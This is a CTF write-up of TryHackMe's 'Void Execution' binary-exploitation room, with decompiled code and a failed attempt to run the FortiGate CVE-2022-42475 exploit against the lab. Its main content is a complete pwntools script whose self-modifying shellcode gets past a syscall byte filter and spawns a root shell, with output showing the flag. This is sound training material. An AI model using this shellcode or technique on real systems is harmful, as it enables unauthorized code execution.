<h1 align="center">Void Execution</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/8e9f37ca-b0ce-444d-b596-7429179628a6"><br>
2025, September 13<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>495</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em></em>Learn how to bypass restrictions in Linux exploit development</em>.<br>
Access it <a href="https://tryhackme.com/room/hfb1voidexecution"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/650c0463-3dfd-4798-b07d-b6df74ef543a"></p>

<h1>Task 1 . Binary Exploitation  .  Void Execution</h1>
<h3>Void Execution</h3>
<p>Today<br>

Please help us find the vulnerability and craft an exploit for the new Void service.<br>

To start the target machine, click the Start Machine button.</p>

<p>[ Start Machine ]</p>

<p>You can connect to the machine with the following command:<br>

Access the machine on the following IP and Port:<br>
MACHINE_IP 9008<br>
You can download the files there.<br>

This challenge was originally a part of the Hackfinity Battle 2025 CTF Event.</p>

<h6 align="center"><img width="200px" src="https://github.com/user-attachments/assets/43a3b35c-27df-415b-a563-fda11288c09a"><br>TryHackMe</h6>

<p><em>Answer the question below</em></p>
<br>


<p>

- downloaded the zipped Task File<br>
- extracted it<br>
- identified its types<br>
- launched Ghidra to analyze it</p>

```bash
:~/VoidExecution# ls
ld-linux-x86-64.so.2  libc.so.6  voidexec  voidexec.zip
```

```bash
:~/VoidExecution# file ld-linux-x86-64.so.2
ld-linux-x86-64.so.2: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, BuildID[sha1]=cccdd41e22e25f77a8cda3d045c57ffdb01a9793, stripped
```

```bash
:~/VoidExecution# file libc.so.6
libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=203de0ae33b53fee1578b117cb4123e85d0534f0, for GNU/Linux 3.2.0, with debug_info, not stripped
```

```bash
:~/VoidExecution# file voidexec
]voidexec: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4d5a5e48c62c321224d9826c7f688051ff95e54b, not stripped
```

<br>
<br>

<img width="1294" height="590" alt="image" src="https://github.com/user-attachments/assets/8799e3d0-1eab-4224-9406-1cda5c4e8453" />

<br>
<br>

<img width="521" height="316" alt="image" src="https://github.com/user-attachments/assets/765cc78e-e732-4764-8213-9293bf572815" />

<br>
<br>
<p><em>main</em> function</p>

```bash
undefined8 main(void)

{
  code *__s;
  undefined8 uVar1;
  
  setup();
  __s = (code *)mmap((void *)0xc0de0000,100,7,0x22,-1,0);
  memset(__s,0,100);
  puts("\nSend to void execution: ");
  read(0,__s,100);
  puts("\nvoided!\n");
  uVar1 = forbidden((long)__s);
  if ((char)uVar1 != '\0') {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  mprotect(__s,100,4);
  (*__s)();
  return 0;
}
```

<br>
<br>

<img width="1120" height="519" alt="image" src="https://github.com/user-attachments/assets/2d7ce6b3-4ae2-413c-bf00-84fadac57e56" />

<br>
<br>

<img width="1306" height="546" alt="image" src="https://github.com/user-attachments/assets/37287d88-2148-40e1-8bab-e03c5d5b0ead" />

<br>
<br>
<p><em>forbidden</em> function/p>

```bash
undefined8 forbidden(long param_1)

{
  ulong local_18;
  
  local_18 = 0;
  while( true ) {
    if (0x62 < local_18) {
      return 0;
    }
    if (*(char *)(local_18 + param_1) == '\x0f') break;
    if ((*(char *)(local_18 + param_1) == -0x33) && (*(char *)(param_1 + local_18 + 1) == -0x80)) {
      puts("Forbidden!");
      return 1;
    }
    local_18 = local_18 + 1;
  }
  puts("Forbidden!");
  return 1;
}
```

<br>
<h2>CVE-2022-42465</h2>
<h3>Remotely exploitable heap overflow in the SSL VPN component of FortiGate and FortiProxy appliances</h3>

<p>

- cloned https://<code>bishopfox.com/blog/exploit-cve-2022-42475</code><br>
- customized IP and Port<br>
- build a virtual environment<br>
- installed Crypto and pycryptodome<br>
- executed CVE-2022-42475.py ... did not work</p>

<img width="1091" height="173" alt="image" src="https://github.com/user-attachments/assets/e601ebc1-1e97-4cc4-b75d-5efb5ee3640d" />

<br>
<br>

```bash
:~/VoidExecution# python3 -m venv rose
```

```bash
:~/VoidExecution# source rose/bin/activate
```

```bash
(rose) ...:~/VoidExecution# pip3 install Crypto
```

```bash
:~/VoidExecution# pip3 install pycryptodome
```

```bash
(rose) ...:~/VoidExecution# git clone https://github.com/0xhaggis/CVE-2022-42475
```

```bash
(rose) ...:~/VoidExecution# cd CVE-2022-42475
```

```bash
(rose) ...:~/VoidExecution/CVE-2022-42475# ls
CVE-2022-42475.py  exploit_data.json  foxrop.py  README.md  requirements.txt  shellcode.o  shellcode.s
```

```bash
:~/VoidExecution/CVE-2022-42475# ./CVE-2022-42475.py -t xx.xxx.xx.xxx -p 9008  -v

    --[ CVE-2022-42475: FortiGate Remote Pre-auth RCE ]--
    --[ Bishop Fox Cosmos Team X                      ]--
    
[+] Running in validate-only mode. No RCE.
[+] Using cached shellcode. Edit ./CVE-2022-42475.py (look for 'shellcode.s') to force refresh.
[+] Configured for connect-back to 127.0.0.1:443
[>] Testing to see if target is vulnerable (may take 10 seconds)
[>] An unexpected response (36 bytes) was recieved:
----- BEGIN RESPONSE -----

Send to void execution: 

voided!


----- END RESPONSE -----
[!] An error occurred testing 'xx.xxx.xx.xxx:9008' for the vulnerability.
[!] Is this even a FortiGate?
```

<br>
<h2>Script</h2>

<p>

- downloaded <a href="https://github.com/w3irdo21/tryhackme-rooms/blob/main/hfb1voidexecution.py">w3irdo21</a>´s script<br>
- executed it</p>

```bash
(rose) ...:~/VoidExecution# cat script.py
#!/usr/bin/env python3

'''

Room Script: https://tryhackme.com/room/hfb1voidexecution
Medium Article for explanation: https://medium.com/@Sle3pyHead/void-execution-tryhackme-ctf-notes-45c0545b5f10

'''

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

# Target configuration
HOST = "xx.xxx.xx.xxx"
PORT = 9008

# From our Ghidra analysis:
# main function at 0x12eb
# mprotect PLT at 0x1100 
MAIN_OFFSET = 0x12eb
MPROTECT_OFFSET = 0x1100

def create_exploit():
    shellcode = asm(f"""
        /* Assume r13 holds main address at runtime */
        /* Calculate mprotect address: main_base - main_offset + mprotect_plt_offset */
        lea rbx, [r13 - {MAIN_OFFSET} + {MPROTECT_OFFSET}]
        
        /* Call mprotect(0xc0de0000, 100, 7) */
        mov rdi, 0xc0de0000         /* address */
        mov rsi, 0x64               /* length (100 bytes) */
        mov rdx, 0x7                /* PROT_READ|PROT_WRITE|PROT_EXEC */
        call rbx                    /* mprotect() */

        /* Setup execve("/bin/sh", NULL, NULL) */
        xor rsi, rsi                /* argv = NULL */
        xor rdx, rdx                /* envp = NULL */
        mov rax, 0x3b               /* sys_execve */
      
        /* Push "/bin/sh" string to stack */
        mov rdi, 0x68732f6e69622f   /* "/bin/sh" */
        push rdi
        mov rdi, rsp                /* rdi points to "/bin/sh" on stack */
        
        /* Self-modifying syscall patch - GENIUS TECHNIQUE! */
        /* Start with safe bytes 0x0e04, increment to get 0x0f05 */
        inc byte ptr [rip + syscall_patch]      /* 0x0e -> 0x0f */
        inc byte ptr [rip + syscall_patch + 1]  /* 0x04 -> 0x05 */
        
        syscall_patch:
        .byte 0x0e, 0x04            /* Will become 0x0f, 0x05 (syscall) */
    """)

    return shellcode

def exploit():
    try:
        # Connect to target
        target = remote(HOST, PORT, timeout=15)
        log.info(f"Connected to {HOST}:{PORT}")
        
        # Generate shellcode
        shellcode = create_exploit()
        log.info(f"Shellcode size: {len(shellcode)} bytes")
        
        # Check for obvious forbidden bytes (should be clean)
        forbidden = [0x0f, 0xcd]
        for i, byte in enumerate(shellcode):
            if byte in forbidden:
                log.warning(f"Forbidden byte 0x{byte:02x} at offset {i}")
        

        # Wait for prompt and send exploit
        target.recvuntil(b"Send to void execution:")
        target.sendline(shellcode)
        
        log.success("Exploit sent! Attempting to interact...")
       
        # Test shell
        target.sendline(b"id")
        target.sendline(b"whoami")
        target.sendline(b"ls -la")
      
        # Look for flag  
        target.sendline(b"find / -name '*flag*' -type f 2>/dev/null")
        target.sendline(b"cat flag.txt")
        target.sendline(b"cat /flag.txt")
        target.sendline(b"cat /root/flag.txt")
        target.sendline(b"cat /home/*/flag.txt")
        
        target.interactive()

        
    except Exception as e:
        log.error(f"Exploit failed: {e}")

if __name__ == "__main__":
    exploit()
```

```bash
(rose) r...:~/VoidExecution# python3 script.py
[+] Opening connection to xx.xxx.xx.xxx on port 9008: Done
[*] Connected to xx.xxx.xx.xxx:9008
[*] Shellcode size: 74 bytes
[+] Exploit sent! Attempting to interact...
[*] Switching to interactive mode
 

voided!

uid=0(root) gid=0(root) groups=0(root)
root
total 6744
drwxr-xr-x 1 root root    4096 Mar 19 06:23 .
drwxr-xr-x 1 root root    4096 Mar 19 06:23 ..
-rwxrwxr-x 1 root root      31 Mar 19 06:04 flag.txt
-rwxrwxr-x 1 root root  240936 Mar 19 05:58 ld-linux-x86-64.so.2
-rwxrwxr-x 1 root root 6618136 Mar 19 05:58 libc.so.6
-rwxrwxr-x 1 root root   20504 Mar 19 06:02 voidexec
/sys/devices/pnp0/00:04/00:04:0/00:04:0.0/tty/ttyS0/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/home/ctf/flag.txt
THM{*************************}
THM{*************************}
$ id
uid=0(root) gid=0(root) groups=0(root)
$ pwd
/home/ctf
$ ll
$ ls
flag.txt
ld-linux-x86-64.so.2
libc.so.6
voidexec
$ cat flag.txt
THM{*************************}
```

<p>1.1. What is the flag?<br>
<code>THM{*************************}</code><br>


<br>
<br>
<h2 align="center">Completed</h2>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/9e51f6eb-7aa2-4290-9f50-ae86527c4c11"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/0c78662d-640b-4eb3-a7dc-1c2bf3f5dad4"></p>


<h2 align="center">My TryHackMe Journey ・ 2025, September</h2>

<div align="center"><h6>

| Date              | Room                                  |Streak   |   All Time<br>Global   |   All Time<br>Brazil   |   Monthly<br>Global   |   Monthly<br>Brazil  | Points   | Rooms<br>Completed     | Badges    |
|:------------------|:--------------------------------------|--------:|:-----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
| 2025, Sep 10      |Medium 🚩 - <code><strong>Devie</strong></code>                       | 494    |     110ᵗʰ    |      5ᵗʰ     |     607ᵗʰ    |     9ᵗʰ    | 125,606  |    959    |    73     |
| 2025, Sep 10      |Medium 🚩 - Backtrack, in progress     | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
| 2025, Sep 10      |Easy 🔗 - Detecting Web Attacks        | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
| 2025, Sep 10      |Easy 🔗 - Attacking ICS Plant #1       | 492    |     110ᵗʰ    |      5ᵗʰ     |     675ᵗʰ    |     9ᵗʰ    | 125,428  |    957    |    73     |
| 2025, Sep 10      |Easy 🔗 - SOC Role in Blue Team        | 492    |     110ᵗʰ    |      5ᵗʰ     |     664ᵗʰ    |     9ᵗʰ    | 125,292  |    956    |    73     |
| 2025, Sep 9       |Hard 🚩 - Python Playground            | 491    |     111ˢᵗ    |      5ᵗʰ     |     693ʳᵈ    |     9ᵗʰ    | 125,236  |    955    |    73     |
| 2025, Sep 9       |Hard 🚩 - Borderlands                  | 491    |     111ˢᵗ    |      5ᵗʰ     |     713ʳᵈ    |    10ᵗʰ    | 125,146  |    954    |    73     |
| 2025, Sep 9       |Medium 🚩 - Forgotten Implant          | 491    |     112ⁿᵈ    |      5ᵗʰ     |     660ᵗʰ    |    10ᵗʰ    | 125,016  |    953    |    73     |
| 2025, Sep 8       |Easy 🔗 - Web Enumeration              | 490    |     112ⁿᵈ    |      5ᵗʰ     |     663ʳᵈ    |    10ᵗʰ    | 124,986  |    952    |    73     |
| 2025, Sep 8       |Easy 🔗 - iOS: Forensics               | 490    |     113ʳᵈ    |      5ᵗʰ     |     548ᵗʰ    |     9ᵗʰ    | 124,850  |    951    |    73     |
| 2025, Sep 7       |Medium 🚩 - VulnNet: Active            | 489    |     114ᵗʰ    |      5ᵗʰ     |     542ⁿᵈ    |     9ᵗʰ    | 124,746  |    950    |    73     |
| 2025, Sep 7       |Medium 🚩 - pyLon                      | 489    |     114ᵗʰ    |      5ᵗʰ     |     535ᵗʰ    |     9ᵗʰ    | 124,716  |    949    |    73     |
| 2025, Sep 7       |Medium 🚩 - Pressed                    | 489    |     113ʳᵈ    |      5ᵗʰ     |     508ᵗʰ    |     9ᵗʰ    | 124,886  |    948    |    73     |
| 2025, Sep 6       |Easy 🚩 - Classic Passwd               | 488    |     114ᵗʰ    |      5ᵗʰ     |     683ʳᵈ    |    12ⁿᵈ    | 124,476  |    947    |    73     |
| 2025, Sep 6       |Medium 🚩 - toc2                       | 488    |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ    |    12ⁿᵈ    | 124,446  |    946    |    73     |
| 2025, Sep 6       |Hard 🚩 - Extract                      | 488    |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ    |    13ʳᵈ    | 124,386  |    945    |    73     |
| 2025, Sep 6       |Medium 🚩 - Plotted-EMR                | 488    |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ    |    12ⁿᵈ    | 124,326  |    944    |    73     |
| 2025, Sep 5       |Medium 🚩 - Inferno                    | 487    |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ    |    12ⁿᵈ    | 124,236  |    943    |    73     |
| 2025, Sep 5       |Easy 🔗 - Psycho Break                 | 487    |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ    |    10ᵗʰ    | 124,152  |    942    |    73     |
| 2025, Sep 4       |Medium 🚩 - Cold VVars                 | 486    |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,048  |    941    |    73     |
| 2025, Sep 4       |Medium 🔗 - IP and Domain Threat Intel | 486    |     113ʳᵈ    |	    5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,018  |   940    |    73     |
| 2025, Sep 3       |Easy 🔗 - Malware Classification       | 485    |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ    |    13ʳᵈ    | 123,882  |    939    |    73     |
| 2025, Sep 2       |Medium 🔗 - Session Forencics          | 484    |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ    |    14ᵗʰ    | 123,786  |    938    |    73     |
| 2025, Sep 1       |Medium 🚩 - Voyage                     | 483    |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ    |    15ᵗʰ    | 123,636  |    937    |    73     |
</h6></div><br>

<br>

<p align="center">Global All Time:   110ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/a90981d1-bf1c-4659-ad55-185cc6c4a23a"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/18299e44-c9b8-4a9c-badf-93633f988ce8"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/ebc74cb0-a55d-4519-9816-bc1ea279ea63"><br>
                  Global monthly:    607ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/2618bb6f-b10f-4187-90f5-ec08996768a5"><br>
                  Brazil monthly:      9ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/6df8e9b5-e47f-4477-ba22-bbff35f7dff4"><br>

<h2 align="center">Thanks for coming!</h2>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>  
